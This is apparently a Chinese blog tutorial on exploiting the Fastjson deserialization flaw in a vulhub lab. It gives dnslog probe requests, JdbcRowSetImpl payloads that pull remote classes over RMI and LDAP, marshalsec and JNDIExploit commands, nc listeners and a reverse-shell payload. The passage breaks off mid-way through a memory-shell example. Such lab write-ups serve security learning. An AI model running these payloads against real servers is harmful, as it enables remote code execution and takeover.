@@ -1,0 +1,323 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Fastjson反序列化漏洞 | RJ の 博客</title><meta name="author" content="Rui Ji"><meta name="copyright" content="Rui Ji"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="Fastjson反序列化漏洞1.漏洞原理1.Fastjson、RMI和JNDI介绍 Fastjson是阿里巴巴公司开源的Java语言高性能功能完善的JSON库，它采用一种假定有序快速匹配的算法，吧JSON Parse的性能提升到极致，是目前Java语言中最快的JSON库，并且它不依赖其他任何库  javaRMI(remote method invocation)即远程方法调用，是允许运行在一个ja">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Fastjson反序列化漏洞">
+<meta property="og:url" content="http://ruijiluo.github.io/2024/06/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="RJ の 博客">
+<meta property="og:description" content="Fastjson反序列化漏洞1.漏洞原理1.Fastjson、RMI和JNDI介绍 Fastjson是阿里巴巴公司开源的Java语言高性能功能完善的JSON库，它采用一种假定有序快速匹配的算法，吧JSON Parse的性能提升到极致，是目前Java语言中最快的JSON库，并且它不依赖其他任何库  javaRMI(remote method invocation)即远程方法调用，是允许运行在一个ja">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2024/06/03/Id1YvTSnFuaXW89.png">
+<meta property="article:published_time" content="2024-06-01T07:24:16.000Z">
+<meta property="article:modified_time" content="2024-08-06T09:22:44.214Z">
+<meta property="article:author" content="Rui Ji">
+<meta property="article:tag" content="web漏洞进阶">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2024/06/03/Id1YvTSnFuaXW89.png"><link rel="shortcut icon" href="https://s2.loli.net/2023/09/07/hRcHvbPo15QmB7T.png"><link rel="canonical" href="http://ruijiluo.github.io/2024/06/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Fastjson反序列化漏洞',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-08-06 17:22:44'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="./themes/butterfly/source/css/bg_color.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2023/09/07/oZOaspjYrzmT5e9.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s2.loli.net/2024/06/03/Id1YvTSnFuaXW89.png')"><nav id="nav"><span id="blog-info"><a href="/" title="RJ の 博客"><span class="site-name">RJ の 博客</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Fastjson反序列化漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-06-01T07:24:16.000Z" title="发表于 2024-06-01 15:24:16">2024-06-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-08-06T09:22:44.214Z" title="更新于 2024-08-06 17:22:44">2024-08-06</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Fastjson反序列化漏洞"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Fastjson反序列化漏洞"><a href="#Fastjson反序列化漏洞" class="headerlink" title="Fastjson反序列化漏洞"></a>Fastjson反序列化漏洞</h1><h3 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h3><h4 id="1-Fastjson、RMI和JNDI介绍"><a href="#1-Fastjson、RMI和JNDI介绍" class="headerlink" title="1.Fastjson、RMI和JNDI介绍"></a>1.Fastjson、RMI和JNDI介绍</h4><ul>
+<li><p><code>Fastjson</code>是阿里巴巴公司开源的Java语言高性能功能完善的JSON库，它采用一种假定有序快速匹配的算法，吧JSON Parse的性能提升到极致，是目前Java语言中最快的JSON库，并且它不依赖其他任何库</p>
+</li>
+<li><p>java<code>RMI</code>(remote method invocation)即远程方法调用，是允许运行在一个java虚拟机上的对象调用运行在另外一个java虚拟机上的对象的方法，java<code>RMI</code>实现JAVA程序之间跨越JVM的远程通信。通过<code>RMI</code>可以让调用远程JVM上对象方法，仿佛调用本地JVM上对象方法一样简单、快捷。</p>
+</li>
+<li><p><code>JNDI</code>(javaNaming And Directory Interface)是JAVA命名和目录接口。应用程序可以通过JNDI API去调用其他资源，包括<code>JDBC、LDAP、RMI、DNS、NIS、windows</code>注册表等等。JNDI将不同的资源进行统一封装，形成一套API，通过这套API，应用程序可以不用关心需要交互的资源细节，方便快捷的与资源进行交互，从而降低开发难度，提高效率。</p>
+</li>
+</ul>
+<h4 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h4><ul>
+<li><p>fastjson的漏洞本质还是一个java的反序列化漏洞，由于引进了<code>AutoType</code>功能，fastjson在对json字符串反序列化的时候，会读取到<code>@type</code>的内容，将json内容反序列化为java对象并调用这个类的<code>setter</code>方法。</p>
+</li>
+<li><p>Auto Type功能的作用是为了区分拥有同一个父类或接口的子类的反序列化，例如下面的ZhangSan和LiSi序列化出来的JSON格式都是一样的，那么就无法区分这一段JSON它原先到底是ZhangSan还是LiSi，就需要添加<code>@type</code>字段来标识子类的完全类名<code>SerializerFeature.WriteClassName</code></p>
+<img src="https://s2.loli.net/2024/06/04/dx7D1Xi9HBvNScg.png" alt="image-20240604155127192" style="zoom:80%;" />
+</li>
+<li><p>使用了<code>@type</code>的类则会通过反射进行<code>newInstance()</code>，调用<code>parse</code>时会调用set相关函数，调用<code>parseObject</code>则会调用<code>get</code>和<code>set</code>相关函数。</p>
+<p><img src="https://s2.loli.net/2024/06/04/ZSthLaHO4T5uMb9.png" alt="image-20240604155822160"></p>
+</li>
+<li><p>当<code>@type</code>的类被恶意构造时，只需要合理构造一个<code>JSON</code>，使用<code>@type</code>指定一个想要的攻击类库就可以实现攻击。</p>
+</li>
+<li><p>常见的有<code>sun</code>官方提供的一个类<code>com.sun.rowset.JdbcRowSetImpl</code>，其中有个<code>setDataSourceName</code>方法支持传入一个<code>dataSourceName</code>:<code>rmi</code>的源,同时使<code>autoCommit</code>:<code>true</code>,就会调用<code>JNDI_API</code>的<code>lookup</code>方法解析<code>rmi</code>用于查询远程对象，实现远程对象别名与远程对象之间的绑定，从而支持远程调用。</p>
+<img src="https://s2.loli.net/2024/06/04/i8l6dJB2SRtsLjq.png" alt="image-20240604160407571" style="zoom:120%;" />
+
+<p><code>这里set了dataSourceName这个属性，因为这里是第一次进入到setDataSourceName里，所以getDataSourceName返回的是null，那么这里执行的分支是else。</code></p>
+<img src="https://s2.loli.net/2024/06/04/2TlcjOWhNHF6bxM.png" alt="image-20240604161912633" style="zoom: %;" />
+
+<p><code>另外又set了autoCommit，需要注意这个函数中，又调用了this.connect()函数。</code></p>
+<img src="https://s2.loli.net/2024/06/04/CEmHt3RjcNSPzIe.png" alt="image-20240604161951231" style="zoom:61%;" />
+
+<p><code>这里会发现调用了var1.lookup()。并且将我们之前设置的dataSourceName值，作为参数传递了。</code></p>
+</li>
+</ul>
+<h3 id="2-漏洞检测"><a href="#2-漏洞检测" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><ul>
+<li><p>本文用kali虚拟机使用vulhub搭建靶场:</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">cd vulhub-master/fastjson/1.2.24-rce</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></li>
+</ul>
+<img src="https://s2.loli.net/2024/06/04/7pSJPAhBT6gW3OQ.png" alt="image-20240604170245435" style="zoom:130%;" />
+
+
+
+<h4 id="1-畸形数据包探测"><a href="#1-畸形数据包探测" class="headerlink" title="1.畸形数据包探测"></a>1.畸形数据包探测</h4><ul>
+<li><p>关于版本号需要注意，如果fastjson本身是大于1.2.76，通过payload报错得到的版本号也是显示为1.2.76的。</p>
+<p>1.2.83版本除外,注意要用POST。》</p>
+</li>
+</ul>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.72.131:8090</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 17</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/06/04/IgmHsJSvjNqBMOL.png" alt="image-20240604173450205"></p>
+<h4 id="2-dnslog外带-常用"><a href="#2-dnslog外带-常用" class="headerlink" title="2.dnslog外带(常用)"></a>2.dnslog外带(常用)</h4><ul>
+<li><p>早期paylocad，适用于在FastJson &lt;&#x3D;1.2.24的版本且在1.2.49禁止了，如果这个poc有效果的话，大概率会有rce。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.72.131:8090</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 74</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;:&quot;java.net.InetAddress&quot;,</span><br><span class="line">	&quot;val&quot;:&quot;22gpss.dnslog.cn&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>缓存通杀paylocad，可以绕过1.2.25-1.2.47之间的fastjson版本的@type限制(使用多层嵌套形式包裹@type)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.72.131:8090</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 74</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;name&quot;:&#123;</span><br><span class="line">		&quot;@type&quot;:&quot;java.net.InetAddress&quot;,</span><br><span class="line">		&quot;val&quot;:&quot;22gpss.dnslog.cn&quot;</span><br><span class="line">   	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<img src="https://s2.loli.net/2024/06/04/Xam6BletS2IUyiV.png" alt="image-20240604181542650" style="zoom: 76%;" />
+
+<img src="https://s2.loli.net/2024/06/04/HxTqjr9DQo3b8a7.png" alt="image-20240604181727075"  />
+
+
+
+<h4 id="3-延时payload探测"><a href="#3-延时payload探测" class="headerlink" title="3.延时payload探测"></a>3.延时payload探测</h4><ul>
+<li><p>左图是数据包的正常响应时间，右图的话是对应的Payload造成的延时效果。根据延时判断的情况，就能确定目标是否有使用Fastjson组件。当访问一个不常见的外网IP地址，会延迟，访问一个内网地址127.0.0.1瞬间返回，那么证明这个POC可用。</p>
+<p><img src="https://s2.loli.net/2024/06/04/Puj6K9NJnv1lBSV.png" alt="image-20240604182127183"></p>
+</li>
+</ul>
+<h3 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3.漏洞利用"></a>3.漏洞利用</h3><p>​           &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;<code>特别注意：要保证java和javac的版本一致，且都是1.8的版本！！！</code>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</p>
+<h4 id="1-手工利用"><a href="#1-手工利用" class="headerlink" title="1.手工利用"></a>1.手工利用</h4><ul>
+<li><p>攻击者访问存在fastjson漏洞的目标靶机网站，通过burpsuite抓包改包，以json格式添加<code>com.sun.rowset.JdbcRowSetImpl</code>恶意类信息发送给目标机。</p>
+</li>
+<li><p>存在漏洞的靶机对json反序列化时候，会加载执行我们构造的恶意信息(访问<code>rmi</code>服务器)，靶机服务器就会向<code>rmi</code>服务器请求待执行的命令。也就是靶机服务器问<code>rmi</code>服务器需要执行什么命令？</p>
+</li>
+<li><p><code>rmi </code>服务器请求加载远程机器的<code>class</code>(这个远程机器是我们搭建好的恶意站点，提前将漏洞利用的代码编译得到<code>.class</code>文件，并上传至恶意站点)，得到攻击者构造好的命令(<code>ping dnslog</code>或者<strong>创建文件</strong>或者<strong>反弹shell</strong>啥的)</p>
+</li>
+<li><p>rmi将远程加载得到的class(恶意代码)，作为响应返回给靶机服务器。</p>
+</li>
+<li><p>靶机服务器执行了恶意代码，被攻击者成功利用。</p>
+<p><img src="https://s2.loli.net/2024/06/04/BpnfDATzJY1ZOqu.png" alt="26de9fc36b2940c6882491c5453db571"></p>
+</li>
+</ul>
+<h5 id="1-1-命令执行"><a href="#1-1-命令执行" class="headerlink" title="1.1 命令执行"></a>1.1 命令执行</h5><ul>
+<li><p>构建恶意<code>class</code>，在&#x2F;tmp&#x2F;创建文件<code>successFrank</code>，使用<code>javac</code>编译<code>class</code>为<code>.class</code>文件</p>
+<p><img src="https://s2.loli.net/2024/06/04/vqLVY3Rf9AZbFax.png" alt="image-20240604231730453"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac pingDnsLog.java  //编译不了的 apt install default-jdk 一下</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/06/04/lhQbs3xZvFc1P9d.png" alt="image-20240604231958550"></p>
+<p><img src="https://s2.loli.net/2024/06/04/M8pOluY7D6VNI9k.png" alt="image-20240604231926678"></p>
+</li>
+<li><p>使用python在<code>.calss</code>对应目录下搭建恶意站点开放5555端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 5555</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/06/04/PdsDjwQJC9WYUZM.png" alt="image-20240604220823183"></p>
+<ul>
+<li><p>然后查看此网址，会看到网站服务器的目录：http:&#x2F;&#x2F;虚拟机ip:5555&#x2F;</p>
+<p><img src="https://s2.loli.net/2024/06/04/R6Dm8naNUAhVB2I.png" alt="image-20240604232029560"></p>
+</li>
+</ul>
+</li>
+<li><p>这里说一下<code>marshalsec-0.0.3-SNAPSHOT-all.jar</code>等下要用，下载地址:<a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></p>
+</li>
+</ul>
+<p>  在<code>pom.xml</code>所在目录，需要运行以下命令生成.jar文件(生成成功后位于此目录的target子目录下)</p>
+<ul>
+<li>下载<code>mvn</code>:<a target="_blank" rel="noopener" href="https://dlcdn.apache.org/maven/maven-3/3.9.7/binaries/apache-maven-3.9.7-bin.zip">https://dlcdn.apache.org/maven/maven-3/3.9.7/binaries/apache-maven-3.9.7-bin.zip</a></li>
+</ul>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>接下来使用<code>marshalsec</code>项目，启动<code>RMI</code>服务，监听<code>9999</code>端口并加载远程类<code>pingDnsLog.class</code>。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="string">&quot;http://192.168.72.131:5555/#TouchFile&quot;</span> 9999</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/06/04/4z5yqh9a2BYUVM8.png" alt="image-20240604232435262"></p>
+</li>
+<li><p>使用bp抓包构建payload</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.72.131:8090</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 74</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;name&quot;:&#123;</span><br><span class="line">		&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://192.168.72.131:9999/TouchFile&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">   	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>成功创建<code>TouchFile</code></p>
+<p><img src="https://s2.loli.net/2024/06/05/QGWOjhNmUlwedTC.png" alt="image-20240605001116430"></p>
+</li>
+</ul>
+<h5 id="1-2-反弹shell"><a href="#1-2-反弹shell" class="headerlink" title="1.2 反弹shell"></a>1.2 反弹shell</h5><ul>
+<li><p>修改java代码构建反弹shell恶意class,其他都和上面同样(一键生成反弹shell:<a target="_blank" rel="noopener" href="https://www.ddosi.org/shell/">https://www.ddosi.org/shell/</a>)</p>
+<p><img src="https://s2.loli.net/2024/06/05/NCpmYtBUqc5jPl4.png" alt="image-20240605001322491"></p>
+</li>
+<li><p>设置监听<code>nc -lvnp 7777</code></p>
+</li>
+</ul>
+<h5 id=""><a href="#" class="headerlink" title=""></a><img src="https://s2.loli.net/2024/06/05/9kl3YRXzbgZajt2.png" alt="image-20240605001640358"></h5><h4 id="2-工具利用"><a href="#2-工具利用" class="headerlink" title="2.工具利用"></a>2.工具利用</h4><ul>
+<li>当目标是可以出网的情况下，可以配合JNDIExploit(<a target="_blank" rel="noopener" href="https://github.com/WhiteHSBG/JNDIExploit)%E5%B7%A5%E5%85%B7%E8%BF%9B%E8%A1%8C%E5%88%A9%E7%94%A8%E3%80%82">https://github.com/WhiteHSBG/JNDIExploit)工具进行利用。</a></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDIExploit.jar -i 运行工具的本机ip</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/06/05/8p2JXG56sbLWCct.png" alt="image-20240605005312840"></p>
+<ul>
+<li><p>在<code>192.168.72.129</code>的<code>1389</code>开启轻量级目录访问协议<code>LDAP</code>,<code>3456</code>开<code>HTTP</code></p>
+</li>
+<li><p>在<code>192.168.72.129</code>开<code>nc</code>监听<code>9999</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9999</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h5 id="1-1-反弹shell"><a href="#1-1-反弹shell" class="headerlink" title="1.1 反弹shell"></a>1.1 反弹shell</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.72.131:8090</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 74</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>:&#123;</span><br><span class="line">		<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">		<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://192.168.72.129:1389/Basic/ReverseShell/192.168.72.129/9999&quot;</span>,</span><br><span class="line">		<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">   	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/06/05/M5S8JPjW9KygHvz.png" alt="image-20240605005355513"></p>
+<ul>
+<li><p>成功反弹shell</p>
+<p><img src="https://s2.loli.net/2024/06/05/vBcS51nTmDGQRIX.png" alt="image-20240605005418792"></p>
+</li>
+</ul>
+<h5 id="1-2-内存马注入"><a href="#1-2-内存马注入" class="headerlink" title="1.2 内存马注入"></a>1.2 内存马注入</h5><ul>
+<li>前面一样,更改bp数据包内容即可</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.72.131:8090</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 74</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>:&#123;</span><br><span class="line">		<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">		